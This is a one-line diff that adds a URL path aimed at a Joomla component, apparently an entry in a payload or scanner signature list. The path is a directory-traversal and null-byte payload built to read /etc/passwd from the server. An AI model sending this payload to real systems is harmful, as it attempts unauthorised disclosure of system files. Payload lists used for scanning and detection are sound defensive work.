@@ -1,0 +1,1 @@
+/index.php?option=com_jotloader&section=../../../../../../../../../../../../../../etc/passwd%00
